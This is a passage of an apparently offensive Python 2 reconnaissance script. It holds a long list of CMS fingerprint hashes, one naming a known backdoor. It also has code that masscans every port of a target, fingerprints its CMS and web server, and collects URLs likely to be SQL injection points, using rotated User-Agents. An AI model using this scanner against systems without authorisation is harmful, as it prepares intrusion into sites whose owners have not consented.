            '/inc/images/logo.png|mlecms|c6b49af9c35ed00f408ea3910b6a2bfb|',
            '/templates/default/admin/images/alert.png|记事狗|dd77ab35bfe56104e640a2a365d2110c|',
            '/member/images/bodyleft.gif|易想CMS|c6a05e162821f56456eafcd9bcd30625|',
            '/admin/images/login_bgyin.gif|汇成企业建站CMS|74dbb894a8acd1529fe1b66600ce229f|',
            '/robots.txt|EmpireCMS|1e5e773092126eadebd896fa7fb1e6e4|',
            '/App_Themes/Admin/admin_images/btn_bg.png|速贝CMS|39bb65a735ff068c3f83ae6b4430689d|',
            '/plus/img/df_dedetitle.gif|dedecms|943144ad409a9f57d941e3b2a785f70e|',
            '752dde8d5209cb3fe9fe7da14bf92b19|opensns|27998a4000f6c5b5d7074a4eeb52a0a2|',
            '/js/upimg/subbotton.gif|cmseasy|bbd26a98bdbb956f9d29fed899789471|',
            '/favicon.ico|hishop|763a44cd191c13f4a23270062aa9a9fd|',
            '/base/templates/images/2.png|phpweb|fa2b19f44a5084d560d707da20846575|',
            '/jwweb/images/button/bgbtn2_0.gif|青果学生系统|a42f7524df1ebb718ae0fb992602ea87|',
            '/admin/views/images/login_logo.png|Emlog|30f23137659a1d7aec7c60c9197ab185|',
            '/images/index_24.jpg|爱装网|75fd826a7697b9dbec065fbff1d9f545|',
            '/plus/weather/icon/a_12.gif|jumbotcms|46d38ccfa5f1a9af463f9d5bfcde5cc6|',
            '/wp-content/themes/twentyten/images/wordpress.png|WordPress|cc452c1368589d88d26f306c49319340|',
            '/rss.xsl|PowerEasy|183af875e26bb90c63f2b2280ed94228|',
            '/admin/images/logo.png|网趣商城|975e13ee70b6c4ac22bc83ebe3f0c06b|',
            '/admin/images/top_banner.jpg|樱桃企业网站管理系统|9cc8f66639bd47ae86a304514fb3e43a|',
            '/ACT_inc/ItemBg.gif|actcms|f2da68ac4c619e437e635b04fe655974|',
            '/images/logo.gif|浪潮CMS|8e111ed7ed44684c5a85be178841fa1c|',
            '/kingdee/images/login_bg.jpg|金蝶协作办公系统|b0dafb425520fa98ed5342155f927a01|',
            '/template/cn/prompt/images/prompt.css|nbcms|c1d080e15e4c5dc0e8cfc7d6cb3249e5|',
            '/favicon.ico|mlecms|a68a2169436bd7a30f2f1e17c2a36b21|',
            '/favicon.ico|iwebshop|46ad7401bb5815164a01ad924ffb1436|',
            '/images/jia.gif|zmcms|1f05b8a0359440454cb4353a303d9aa0|',
            '/robots.txt|EmpireCMS|bfedf87aeb5035d6fb8aacc3f54265de|',
            '/Themes/default/zh-cn/images/CertificateLogo.jpg|hishop|22bb27a3cf647dca3e4d0e2ccbd5cad8|',
            '/TrueLand_T_Site_Wsmmst/images/dl_bg.jpg|T-Site建站系统|a06a5f4e2d0c9d86d3324e0b26549e8c|',
            '/robots.txt|Discuz|58cf5e109205b7c5e9d9e6630a6357c4|',
            '/article/ADMIN/IMAGES/number.gif|尘缘雅境图文系统|e9d28857edfe55ff3b5b4cc75e3dbf7e|',
            '/Script/Html.js|Southidc|525c4fc0129a84f864d7a71ee4f30a2b|',
            '/admin/images/top_tt_bg.gif|xycms|371736e0e9c0cca936982da3465301e0|',
            '/admin/skin/images/topbg.gif|爱淘客|24f88f73da8efb7eeb63b083166ccb98|',
            '/admin/Inc/southidc.css|Southidc|58b439b67ea0151ff3b5f631cd165135|',
            '/defaultroot/images/bg.png|万户OA|f8b341940465d9d73f042562813dbde4|',
            '/images/admin/login/logo.png|PHPWind|b11431ef241042379fee57a1a00f8643|',
            '/life/img/kuang1.gif|未知查询系统|db0ebf565d93d8c37f51d61ec4fda7b8|',
            '/template/default/images/index_97.jpg|maxcms|ff7a8706393b68ebed8015171a3c036e|',
            '/Images/cover-default-s.gif|ILAS图书系统|1df676c975c41ede531c4a7f6c99559f|',
            '/images/user.gif|51Fax传真系统|868773eab4863759e70b838180aa399f|',
            '/wap/templates/met/images/listico.gif|metinfo|f0560d4bac435da2cbd2729504ba3744|',
            '/question/images/face/images/ico_face_arrow.gif|jumbotcms|28acc83650388bf279d7113f8574c58c|',
            '/favicon.ico|hishop|1c59aa6bdc1892260632a6db296b01ea|',
            '/data/cache/inc_catalog_base.inc|dedecms|b780f6325717b238bb2cd9c9544a49e7|',
            '/admin/help/zh_cn/database.xml|ecshop|69c3771ecefbc3b8582e6b096325525c|',
            '/csdj/admin/images/close.gif|程氏舞曲CMS|702f29bd25f306144af3709da988bcea|',
            '/js/calendar/active-bg.gif|ECSHOP|F8FB9F2B7428C94B41320AA1BC9CF601|',
            '/.htaccess|Drupal|829f15436ace158a3bc822fb2216d212|',
            '/licence.txt|phpwind|1d7ac45421087cb8faaf8a83a8df8780|',
            '/images/down_arrow.png|DayuCms|9edd76b87c325c2e00c5dca7f709064e|',
            '/images/admina/logo.png|08cms|413946cd43e990aa551335198ae5b631|',
            '/public/ico/favicon.png|悟空CRM系统|834089ffa1cd3a27b920a335d7c067d7|',
            '/robots.txt|Joomla|929b54790a63f8c61070c8e408bdd55f|',
            '/ACT_inc/share/minusbottom.gif|actcms|934a2b40df618be35f7488ac3245aca6|',
            '/wp-admin/css/login.min.css|wordpress|5986a1680538ac8e83d217027d57543f|',
            '/plus/carbuyaction.php|dedecms|f2f63580e59ebe950d72329b64982567|',
            '/manager/style/logo.gif|MajExpress|93ae931f59bc3265d67f521d63e67721|',
            '/dayrui/statics/default/images/touming.png|finecms|b8a085a634d0be85b586352dd0653889|',
            '/favicon.ico|IMO云办公室系统|434df3c91ce4dc6627cfa1824d5fa2d6|',
            '/user/face/2.gif|KingCMS|059014cbce00d3028cbb3a74eb20e837|',
            '/images/admin/readme.gif|cmseasy|3ca64935f89925da7e026d65a85852f7|',
            '/admin/image/title.gif|良精南方|03d2c478f7998aef487c593fb591b4dd|',
            '/celive/templates/default/skin/admin/bg.gif|cmseasy|5a32a9a43815d203842b68e7d14e9303|',
            '/favicon.ico|Zoomla|a24a657dd169b1ba2f9ae7a6844dc7a3|',
            '/images/qq/qqkf2/Kf_bg03_03.gif|aspcms|86e0554ab2d9f46bab7852d71f2eecd3|',
            '/login.js|分类信息网bank.asp后门|885e990ba6f70e555f04e86fe1a41b9b|',
            '/views/default/images/hotbg.gif|finecms|fa475c40a6fa77c26759edb4b0bab182|',
            '/images-global/zoom/zoom-caption-fill.png|abcms|4b6f9654b24b1ef9670b361642f444b|',
            '/admin/images/step4.jpg|ideacms|5126977766e7509190e44a7386845e6b|',
            '/webmail/skins/AfterLogic/gradients.png|AfterLogicWebMail系统|5ea6a40fdcd3f038404ae8e6a172bb29|',
            '/help/images/logo.png|PHP168|7D724EDB9B5A2AE6E9810D9B8704B1BE|',
            '/images/_m10.GIF|青果软件教务系统|5f18dc98d899dadec18bd506ff17f253|',
            '/favicon.ico|TipAsk问答系统|f6caa8f20ec8399cc3de29dcf5612209|',
            '/data/cache/index.htm|dedecms|736007832d2167baaae763fd3a3f3cf1|',
            '/anmai/images/logobot.gif|anmai安脉教务管理系统|001c0f78b68aa2f54eed8a91839e91a8|',
            '/wap/templates/default/images/nv_r2_c1.gif|jishigou|01e6eab5e28f37d1daa28e9463aa36c6|',
            '/system/images/logo.png|kingcms|050aa01fafbc432c5b97893282784e61|',
            '/images/enums.js|dedecms|802e864c70aa6cfd766607a09ef0adf2|',
            '/inc/image/bj.gif|ideacms|9e16b585ce621de35d6f09fb83c945f9|',
            '/admin/images/top_bg.gif|XpShop|7fcfd296a66680b4eb62bd97ece3bd03|',
            '/admin/images/cutimg/ccc.gif|qibocms|325472601571f31e1bf00674c368d335|',
            '/zabbix/favicon.ico|Zabbix|84dc123a94418b2897cbd147883472d6|',
            '/favicon.ico|天柏在线考试系统|da3eee9122f79d393ff6f105809c9d78|',
            '/favicon.ico|otcms|aee5467a4a6dbcc6a2cd3b080b08bbb8|',
            '/jw/hlp/Images/vertline.gif|qzdatasoft强智教务管理系统|7ccf3630fd1411ebf613569db4fff783|',
            '/admin/Tpl/default/ThemeFiles/Images/login/logins_01.png|fangwei|f2f98f79ea7b2c3713fc1c44e08a6479|',
            '/images/index/login.jpg|WebOffice|b934ae3847e6290f8bfc983cbe2f0c26|',
            '/oa/errors/images/ico_fhsy.gif|金蝶OA|e4cd63dfacdfbd8ce5377a19b7325936|',
            '/static/ayacms.gif|ayacms|a8dcc596e48119b4ebca732f5ff4a561|',
            '/style/jbox/skins/currently/images/jbox-close1.gif|绿麻雀借贷系统|7aaa517d007c879e98c4a0753083b978|',
            '/webmail/template/default/images/logo.jpg|时代企业邮|dc1aeffe26c99ddc0c8a5b102be16214|',
            '/favicon.ico|H5酒店管理系统|4dbf8141d340968d7d999e8ccea08d00|',
            '/images/admin/sprites.png|akcms|80d5e4b529aeb4d4516045918e3f7e47|',
            '/logo/images/icon_bg.gif|Yongyou|575b4e873e6b5172ba35979e7f9cbc28|',
            '/template/cn/red/js/ks-switch.pack.js|nbcms|f349b7cdda74326b8f8adc3c3bab2f7d|',
            '/static/image/admincp/bg_repno.gif|Discuz|403889213f03534a0651d7cfd6878b2c|',
            '/sites/all/themes/README.txt|drupal|afa129b3ed3028a3caffa545e2bbf6e5|',
            '/login.jpg|Yongyou|235b8d7477b4343f550815b74b15a00c|',
            '/wb_image/tp.gif|WizBank|b151ea708acb80575f6959dd1e91c575|',
            '/Themes/default/zh-cn/images/bbs_nav.jpg|hishop|d88db219971bf146c1e0f958f7323b0d|',
            '/wap/templates/met/images/listico.gif|metinfo|21530b0202a60b21f9207155d1d11411|',
            '/Server/Images/b_b.gif|用友|6c52dd6d2ea7c2f38bf34f3fe9d64f74|',
            '/public/plug/im/im_bg.png|espcms|702ba61913dbdebfeaa403379b5cfc8a|',
            '/images/favicon.ico|N点虚拟主机|33d3bfd23bab7743aa34c3b740623fdb|',
            '/phpmyadmin/themes/pmahomme/img/logo_right.png|PhpMyAdmin|6537bfe0438d4073b92f3e0a05dd3fb4|',
            '/data/admin/allowurl.txt|dedecms|324b52fafc7b532b45e63f1d0585c05d|',
            '/hlp/Images/vertline.gif|qzdatasoft强智教务管理系统|7ccf3630fd1411ebf613569db4fff783|',
            '/include/data/words/words.txt|dedecms|A6E051B48D3E66EF4712D2699B5D80B1|',
            '/Admin/Include/version.xml|KesionCMS|cec7abfd732f03ab3abb87e3b2fb7de1|',
            '/License.txt|PowerEasy|fe3760309e0fd93f3b68517603f15776|',
            '/App_Themes/theme1/images/ui-btn_yellow.gif|擎天政务系统|862df2aafc3bae92bc4c61db931706cd|',
            '/office/images/login/ico.gif|定海神真|729b33e48ffb45bbe2c7112b409c4524|',
            'images/post/post_reply.gif|dvbbs|2cdb57865c172c9c7ab6201ad0b50893|',
            '/theme/admin/images/logo_login.gif|sdcms|72ff65356a6ccd4b9c43b6f2861b1788|',
            '/favicon.ico|dedecms|21e51cee51c833c76dec691155d0d8a4|',
            '/favicon.ico|EduSoho|c1cea3b23c55e8fd9d66c7885aa1e378|',
            '/tpl/images/cmsloginui.png|eShangBao易商宝|ae78e31871b06d3f6ba329673d4b879c|',
            '/upFiles/images/thumb_2011010241734953.jpg|网钛文章管理系统|c6bb2d26d9432d37ac8c2cc5347b12e3|',
            '/Admin/images/install_logo.jpg|hishop|69c446d6c848f1360a7546ce2e0789ea|',
            '/images/bg1.gif|luzhucms|94bff0a127e4555ca4ec52be7ef45e25|',
            '/login.jpg|Yongyou|e3a6eb1eb2024f7f36a45164fba14513|',
            '/windid/res/images/admin/login/logo.png|phpwind|9f49bb571729b7b82ed9bcd2b4344e9f|',
            '/admin/Image/title.gif|skypost|2fbb8e5bcdefd563c50f43a0716ef134|',
            '/admin/images/left_title2.gif|蓝科CMS|f31bb2f1b0a0b21bca18a0ba4943609c|',
            '/member/images/member.gif|dedecms|4357834e5cd7cfdd3ea93dc93eefda9a|',
            '/e/data/ecmseditor/images/blank.html|EmpireCMS|8eaf3eb0a904b0507199a644d1026fd7|',
            '/favicon.ico|B2Bbuilder|dff7f7fc1ebf81aff8b7c6b57e274207|',
            '/admin/views/style/green/style.css|EMLOG|4d50eee0c43bc7d1ac708c5622d5b481|',
            '/admin/Inc/southidc.css|Southidc|cf4f836d5c9f49631bdd86a1a9a9cf67|',
            '/api/manyou/cloud_channel.htm|Discuz|3727a83598705aaa40b96fdee42e13cc|',
            '/theme/10/images/icon64_error.png|通达OA系统|550054b45c5da9c275d60e1d163819e9|',
            '/rss.xsl|Powereasy|183af875e26bb90c63f2b2280ed94228|',
            '/images/logout/topbg.jpg|TurboMail邮箱系统|f6d7a10b8fe70c449a77f424bc626680|',
            '/TrueLand_T_Site_Wsmmst/images/yaoshi.png|T-Site建站系统|d88db0b65a87f40d52959cc41f9b66c1|',
            '/install/images/logo.gif|sdcms|17f8a25eb1757baf3d4b6522a635057c|',
            '/bbs/pic/0.gif|6KBBS|cd2fde781b6275ed27ce06e646f1ccbd|',
            '/favicon.ico|EasySite内容管理|9b80aea9d0d05345d646815e3f9f76d3|',
            '/admin/images/admin_top.gif|商奇CMS|c9f020b6e9113221ff87f89d88234b23|',
            '/install/images/bg-input.png|phpshop|b70b0a713b98a0c3f5ec15bcb3eebb81|',
            '/admin/images/login.gif|EC_word企业管理系统|f762fa9035ad8ca7beb351bfffc7c354|',
            '/favicon.ico|dvbbs|9f198fc3a78304e3e618be89c4e912b4|',
            '/template/skin4/images/logo.png|ieadcms|74e03e9c5484862890fc61a144ca0bf4|',
            '/ewebeditor/KindEditor.js|php168|e2230f70fa19f55e898cc8adbd2e2cd7|',
            '/robots.txt|EmpireCMS|1e5e773092126eadebd896fa7fb1e6e4|EmpireCMS|',
            '/e/install/images/logo.gif|pageadmin|4686d086a472354238483f65ed13f565|',
            '/images/by.nzcms.gif|宁志学校网站|c96ace266169ca39f774f01b1f286644|',
            '/member/statics/OAuth/qq.png|finecms|897108b470ccbf2c9f796fe11e30f981|',
            '/robots.txt|phpCMS|0fd86d5f9c1070613e22fb30456bf609|',
            '/office/images/login/ico.gif|nitc(定海神真)|729b33e48ffb45bbe2c7112b409c4524|',
            '/admin/images/icon_close.gif|sdcms|824a335f64dbc69f3724784f491ad09f|',
            '/live800/style2/img/advisor.png|Live800|88d536b6f7b2238bf218ed25cf34bb4f|',
            '/wp-includes/css/buttons.min.css|wordpress|74ac6750d8faed75774166c72f88fcbf|',
            '/libs/xheditor/xheditor_plugins/editor.gif|phpok|c83d69ea9a0656eafcc7ce61ea8389b0|',
            '/admin/ckeditor/images/spacer.gif|kuwebs|71a0b5972fded79257c0b92afd3051bb|',
            '/templates/default/css/img/index/bg-skirt.gif|AppCms|62029ccf4af64fda36a380c334ee2a3c|',
            '/templates/default/css/img/stars.gif|AppCms|1d0c675c0c08249f75a6ce7984f96470|',
            '/jwgl/hlp/Images/node.gif|qzdatasoft强智教务管理系统|70ee6179b7e3a5424b5ca22d9ea7d200|',
            '/Admin/images/t2_r1_c5.jpg|老Y文章管理系统|daf04071f5c77bb25a3cbe1c856f9c00|',
            '/admini/images/dt_admin_top_bg.png|shlcms|03bb43983d24f025feef18bf42d71f53|',
            '/houtai/img/admin_top_logo.gif|dedecms|1e78c168da8271af6538b00e4baf53d5|',
            '/install/images/00.png|abcms|1513efc63c01b27ec75402e4b0d3b95f|',
            '/admin/images/li_10.gif|qibosoft|1a23ab6128b1a4c56f8d2782e4796232|',
            '/images/admina/logo.png|08cms|db113c0f641da45947a371c4b7e1d280|',
            '/template/default/admin/images/btn.gif|phpshe|d9502f7f7ee74153fec0e8c196b1e647|',
            '/Admin/Images/logo.jpg|actcms|df86ce8c3068dafd2d5d2b0e40cde667|',
            '/view/resource/skin/skin05/img/login_bg.png|未知政府采购系统|25495fa955f13fb6d884dccd38115f35|',
            '/user/face/2.gif|kingcms|806b062dbb2377d05cad134d53d706a1|',
            '/inc/images/logo.png|mlecms|0dbcba4ea06639819cc0924d3a7ed3fd|',
            '/images/2/more.gif|e创站|c48e6cb57ea70b93edc865487336a9c9|',
            '/bbx/img/kuang1.gif|未知查询系统|db0ebf565d93d8c37f51d61ec4fda7b8|',
            '/sysmanage/Images/login_02.jpg|众拓|d31024e289ee72d904f7f23ecb651b6c|',
            '/kingdee/weboa/images/formtable_bg.gif|金蝶协作办公系统|ab560312b75bd5c9f048c5ba98c19dfd|',
            '/logo/images/ufida_iufo.png|Yongyou|324ed9cd53183f9052c2ff872d418c50|',
            '/images/index_border1.gif|青果软件教务系统|6847aab9eafaa3b18c9779ddf34f92e2|',
            '/images/password.gif|51Fax传真系统|ecc6bb79200836fd9c08cb604bbdf28c|',
            '/robots.txt|WordPress|b138a3153b813846c14a8c7d8b538aa0|',
            '/Admin/Images/southidc.css|southidc|61b43a242263d428f86aa4582ee41c26|',
            '/Admin/images/login_r4_c4_r1_c1.jpg|老Y文章管理系统|eda07be3c5fb86a69170676cc7a7567c|',
            '/tool/img/kuang1.gif|未知查询系统|db0ebf565d93d8c37f51d61ec4fda7b8|',
            '/console/framework/skins/wlsconsole/images/Branding_WeblogicConsole.gif|WebLogic|943ffab4d425979a3bb0bacaa4d0deb7|',
            '/question/images/face/images/ico_face_arrow.gif|jumbotcms|5675aebf07539d8a0caae1b2ec329c25|',
            '/images/enums.js|mvmmall|459ea752c044ec4dc744c4d6fdc78d9e|',
            '/pic/an_01_a.png|用友|64515c1f99cbeaab109d8365ad48429d|',
            '/admin/images/left_nav.jpg|凡诺企业网站管理系统|fe8aad7090bece72587c86ec6f7c7d6a|',
            '/robots.txt|phpcms|7750f62fc14ea34527c09c7694a3d406|',
            '/images/zip.png|phpok|82c39858f221dbda74ca71d5415f5791|',
            '/admin/templates/met/images/logosmall.gif|metinfo|4e3c4a90556f8c35d4ab577e985239af|',
            '/inc/image/m_tleft.png|ideacms|369d7212fb62338d3dd23bb8d8c35de3|',
            '/view/resource/skin/skin.txt|未知政府采购系统|a480002efb18e6b0d143b78b9bd3ab7b|',
            '/images/tt.gif|菲斯特诺期刊系统|4c1a973b15d26bf1dac2d0c72a63ce90|',
            '/data/css/arrow-down-title.jpg|siteengine|17892ea0dd5e52f86774aaecf7414763|',
            '/admin/images/left_menu.png|phpshop|1eb47cb1b95dd9426cb2bcda84b6e844|',
            '/DatePicker/skin/datePicker.gif|Southidc|a9d8d517dbe910477a1f2ad5c78228d8|',
            '/jcms/css/global.css|大汉JCMS|d8fb44266bf9a239e2a0906dfebae160|',
            '/favicon.ico|Jboos|1b24a7a916a0e0901e381a0d6131b28d|',
            '/lib/images/tip_layer.png|sdcms|a5436b17d0815080d5113ffeb1253379|',
            '/favicon.ico|Winmail|Server|645423e6c549f16a1dc6499ace25a95f|',
            '/admin/images/login.gif|EC_word企业管理系统|bcb18414fa6fd6be0bd85e5f71915f43|',
            '/favicon.ico|jumbotcms|6176a96a219c1244ad9bee96bb07772d|',
            '/favicon.ico|jishigou|fe5b5f6f65603a3180218b6b32097683|',
            '/license.txt|codeigniter|f36cb575cce73f64a53b489d3f94c683|',
            '/theme/admin/images/login/bg.jpg|BookingeCMS酒店系统|72e036f42aa51a02524e9e7b8c25acd9|',
            '/adminsoft/templates/images/windowclose.jpg|espcms|a065fe4dcf529c47e21be6d664d84cc5|',
            '/images/ui/artlt_dot.png|青云客CMS|632173e3898d4c601c82630a36043730|',
            '/bbs/pic/type0.gif|6KBBS|77eab484baae891d1124abc7ccd106e3|',
            '/images/style_error.css|万众电子期刊CMS|e4f033350a15445909cb5eed5de5c332|',
            '/images/lajipic010_1.gif|亿邮Email|4fd26fa6dc51a12cdbb6adc39ef7ce83|',
            '/statics/images/admin_img/images/bg.jpg|H5酒店管理系统|3319b5e84b1da72c27ec4c926a83b910|',
            '/KS_Inc/ajax.js|kesioncms|703742511c08474004c2f3299e92709d|',
            '/App_Themes/default/images/bodybg1.gif|联众Mediinfo医院综合管理平台|ed81815c304a003fb41aaae7610493b3|',
            '/zb_system/image/admin/ok.png|z-blog|8bfed48756f192ed7afe6eaa4799aae4|',
            '/robots.txt|Discuz|362ef88efd959694b37e6ac6b2013cb7|',
            '/components/com_mailto/views/sent/metadata.xml|joomla|0ba58ea6faac8f92c7c38ecbce55444b|joomla|',
            '/web/resource/images/success-small.png|微擎科技|c37818f25d5906f5de44bea32ef09878|',
            '/favicon.ico|Dzzoffice|8f7beb9a0409ba53680d99dff27c64fa|',
            '/images/t4.gif|智睿网站系统|79d3d57a9400c1849ecd0409b8fa46b1|',
            '/style/default/hdwiki.css|HDwiki|59b35e72b37ffc2886f76873c93fbcd9|',
            '/admin/eims.js|eimscms|0493948e1b9fb184b65b31d0d908afd7|',
            '/job/templates/met/css/style.css|metinfo|3d906218998f71e198808b7895c4dc96|',
            '/admin/template/images/site_logo.png|建站之星|a9a0fdda4e22adb443c3fa14b97af0ea|',
            '/public/tinyMCE/themes/simple/img/icons.gif|espcms|3A228C1277D7BDFADA1AD8935A69D5DA|',
            '/api/login.api.php|nbcms|9f0e3df5b46b039ed97c68242dff6621|',
            '/adminimages/title.GIF|露珠文章管理系统|625f2078f5cc4bbffb4f1390f982b66b|',
            '/admin/img/logina3.gif|VENSHOP2010凡人网络购物系统|9f174c4c7b72c96589f850e3b5d33361|',
            '/assets/v2/img/icon_search.png|EduSoho|5ca41ea40171e1ea0fc7f200281b6714|',
            '/images/login-background.jpg|华夏创新AppEx系统|1929c7004265246bdc2c46b61a39fca4|',
            '/Manage/TreeNodeImg/icon01.gif|易创思教育建站系统|7e2f7a410b54ef80399954293c3e45ca|',
            '/wp-content/themes/twentyten/images/wordpress.png|WORDPRESS|cc452c1368589d88d26f306c49319340|',
            '/images/lajipic012.gif|亿邮Email|d23fb928a0b8757786b003fe9c2ec72e|',
            '/images/logo_wap.png|cmseasy|b9281e6bd84987b3bcb5684d89c313cc|',
            '/images/admina/arrow.jpg|08cms|6ad561345b55814902d014707015cf72|',
            '/e/js/lang/zh-cn.js|pageadmin|55b4396bac94c6eb98fe4a4cf4434c26|',
            '/install/images/top-logo.png|dedecms|ef329ec49d3ae5c1b7175b2ec9470d2c|']


# cms_types = len(set([x.split('|')[1] for x in cms_rule]))
# # cms指纹种类
# cms_counts = len(cms_rule)
# # cms指纹条数


class Get_Info:
    def __init__(self, url):
        self.url = url
        print unicode('获取网页信息中.....','utf-8')

    def get_ip(self):
        # 该函数的作用是获取网址的真实IP
        # 传入网址即可，获取失败则返回None
        hostname = self.url.replace('http://', '').replace('https://', '').replace('/', '')
        url_ip = 'None'
        try:
            url_ip = socket.gethostbyname(str(hostname))
        except:
            pass
        return url_ip

    def get_ipinfomation(self, *args):
        # 该函数的作用是传入一个列表
        infos_ = []
        for x in args:
            for xx in x:
                d = get_ports(str(xx))
                if d != []:
                    infos_.append('端口:' + str(xx) + '\n服务:' + str(d['name']) + '\n功能:' + str(d['description']) + '\n')
                else:
                    infos_.append(str(xx) + ':' + str('识别失败'))
        return infos_

    '''

    这个函数作用是接受一个列表,列表内是端口
    然后通过whatportis返回端口对应的服务
    返回内容如下：
        [80:http,3389:rdp]

    '''

    def get_ips(self):
        hostname = self.url.replace('http://', '').replace('https://', '').replace('/', '')
        url_ip = 'None'
        try:
            url_ip = socket.gethostbyname(str(hostname))
        except:
            pass
        if url_ip and url_ip != 'None':
            mas = masscan.PortScanner()
            mas.scan(url_ip)
            url_port = [80]
            url_port = mas.scan_result['scan'][url_ip]['tcp'].keys()
            if 80 in url_port:
                pass
            else:
                url_port.append(80)
                # for port in ports:
                # s = socket.socket()
                # try:
                #     s.connect((url_ip,port))
                #     url_port.append(port)
                # except Exception,e:
                #     # print e
                #     pass
                # finally:
                #     s.close()
        if url_ip or url_ip != 'None':
            infos = {}
            infos['ip'] = str(url_ip)
            infos['ports_open'] = str(url_port)
            infos['ports_info'] = str(self.get_ipinfomation(url_port))
            return infos
        else:
            infos = {}
            infos['ip'] = '获取失败'
            infos['ports_open'] = '获取失败'
            infos['ports_info'] = '获取失败'
            return infos

    '''

    这个函数作用是把url转换成ip，然后用masscan扫描这个ip的全部端口
    返回一个字典，给字典有4个属性
    分别是 ip 端口 端口与对应的服务 以及位置坐标
    返回内容如下：

    {
        'ip':'127.0.0.1',
        'ports_open':'[80,3389]',
        'ports_info':'[80:http,3389:rdp]',
        'ports_address':'中国'

            }

    '''

    def get_infos(self):
        try:
            UA = random.choice(headerss)
            headers = {'User-Agent': UA}
            r = requests.get(url=self.url, headers=headers, verify=False, timeout=9)
            url_title, url_content, url_service = '获取失败', '获取失败', '获取失败'
            try:
                code = chardet.detect(r.content)['encoding']
                bp = bs(r.content.decode(code).encode('utf-8'), 'html.parser')
                url_title = bp.title.string
                # url_contents = bp.text
                try:
                    url_service = r.headers['Server']
                except:
                    url_service = '获取失败'
            except:
                url_title = re.search('<title>(.*?)</title>', r.content, re.I).group(1).decode(code).encode('utf-8')
                # url_content = re.sub('([\.\?\*~!@#{$%\^&\*()-;"<>\[\]}_\+=]|[0-9]|[a-z]|[A-Z])','',r.text)
                try:
                    url_service = r.headers['Server']
                except:
                    url_service = '获取失败'
            infos = {}
            infos['url'] = self.url
            infos['title'] = url_title
            url_contents = ''.join(r.text.split()).replace(' ', '').replace('\r\n', '').replace('\r', '')
            infos['content'] = re.sub('([\.\?\*~!@#{$%\^&\*()-;"<>\[\]}_\+=])', '', url_contents).replace('|',
                                                                                                          '').replace(
                "'", '')
            # 下面这行的代码会过滤掉所有的英文和数字
            # infos['content'] = re.sub('([\.\?\*~!@#{$%\^&\*()-;"<>\[\]}_\+=]|[0-9]|[a-z]|[A-Z])','',url_contents).replace('|','').replace("'",'')
            infos['service'] = url_service
            if infos:
                return infos
            else:
                infos = {}
                infos['url'] = self.url
                infos['title'] = self.url
                infos['content'] = '获取失败'
                infos['service'] = '获取失败'
                return infos
        except Exception, e:
            # print e
            infos = {}
            infos['url'] = self.url
            infos['title'] = self.url
            infos['content'] = '获取失败'
            infos['service'] = '获取失败'
            return infos

        '''

        返回内容如下：
        {
        'url':'http://www.langzi.fun',
        'title':'浪子博客'，
        'content':'xaffa网页内容xafgasdas',
        'service':'Apache'
        }

        '''

    def get_urls(self):
        urlss = []
        live_urls = []
        UA = random.choice(headerss)
        headers = {'User-Agent': UA}
        try:
            r = requests.get(url=self.url, headers=headers, verify=False, timeout=9)
            pattern = re.compile(r'http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\(\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+',
                                 re.I)
            urls = re.findall(pattern, r.content)
            for x in urls:
                a1, a2 = x.split('//')[0], x.split('//')[1].split('/')[0]
                a3 = ''.join(a1) + '//' + ''.join(a2)
                urlss.append(a3.replace("'", "").replace('>', '').replace('<', ''))
            if urlss:
                for _ in list(set(urlss)):
                    UA = random.choice(headerss)
                    headers = {'User-Agent': UA}
                    try:
                        rr = requests.head(url=_, headers=headers, timeout=5, verify=False)
                        if rr.status_code == 200:
                            live_urls.append(_)
                        else:
                            pass
                    except:
                        pass
                return live_urls
            else:
                return None
        except Exception, e:
            # print e
            pass

    def get_cms(self):
        resu = {}
        for cmsxx in cms_rule:
            cmshouzhui = cmsxx.split('|', 3)[0]
            cmsmd5 = cmsxx.split('|', 3)[2]
            cmsname = cmsxx.split('|', 3)[1]
            urlcms = self.url + str(cmshouzhui)
            try:
                UA = random.choice(headerss)
                headers = {'User-Agent': UA}
                req1 = requests.head(url=urlcms, headers=headers, timeout=3, allow_redirects=False)
                if req1.status_code == 200:
                    req1_2 = requests.get(url=urlcms, headers=headers, timeout=3, allow_redirects=False)
                    md5 = hashlib.md5()
                    md5.update(req1_2.content)
                    rmd5 = md5.hexdigest()
                    if rmd5 == cmsmd5:
                        resu['cms'] = cmsname
                        return resu
                    else:
                        pass
                else:
                    pass
            except Exception, e:
                resu['cms'] = 'None'
                return resu


'''
信息采集
调用方法如下：
    a = Get_Info('http://www.langzi.fun')

    print 'IP:' + a.get_ip()
    print 'URLS:'+str(a.get_urls())
    print 'CMS:'+str(a.get_cms())
    print 'Infon:'+str(a.get_infos())
    print 'IPS:' + str(a.get_ips())

IP:180.97.158.239

URLS:['https://blog.csdn.net', 'http://www.langzi.fun', 'https://github.com']

CMS:{'cms': 'None'}

Infon:{'url': 'http://www.langzi.fun', 'content': u'DOCTYPEhtml'}

IPS:{'ip': '180.97.158.239', 'ports_info': "['80:World Wide Web HTTP', '8443:PCsync HTTPS', '8009:\\xe8\\xaf\\x86\\xe5\\x88\\xab\\xe5\\xa4\\xb1\\xe8\\xb4\\xa5', '8080:HTTP Alternate (see port 80)', '8181:Intermapper network management system', '8088:Radan HTTP', '443:http protocol over TLS/SSL']", 'ports_open': '[80, 8443, 8009, 8080, 8181, 8088, 443]'}


'''


def get_links(url):
    '''
    需要的有常规的注入点
        1. category.php?id=17
        2. https://www.yamibuy.com/cn/brand.php?id=566
    伪静态
        1. info/1024/4857.htm
        2. http://news.hnu.edu.cn/zhyw/2017-11-11/19605.html
    :param url:
    :return: id_link
    :return: html_link
    :return title
    '''
    domain = url.split('//')[1].strip('/').replace('www.', '')
    result = []
    id_links = []
    html_links = []
    result_links = {}
    html_links_s = []
    result_links['title'] = '网址标题获取失败'
    idid = []
    htht = []
    try:
        headers = {
            'User-Agent': random.choice(headerss),
            'Accept': 'Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Cache-Control': 'max-age=0',
            'referer': random.choice(REFERERS),
            'Accept-Charset': 'GBK,utf-8;q=0.7,*;q=0.3',
        }
        rxww = requests.get(url, headers=headers, timeout=5).content
        soup = BeautifulSoup(rxww, 'html.parser')
        try:
            result_links['title'] = soup.title.string
        except Exception, e:
            writedata('[WARNING ERROR]  ' + str(e))
            try:
                result_links['title'] = re.search('<title>(.*?)</title>', rxww, re.I | re.S).group(1)
            except Exception, e:
                writedata('[WARNING ERROR]  ' + str(e))
                pass
        if result_links['title'] == '' or result_links['title'] == None:
            result_links['title'] = url
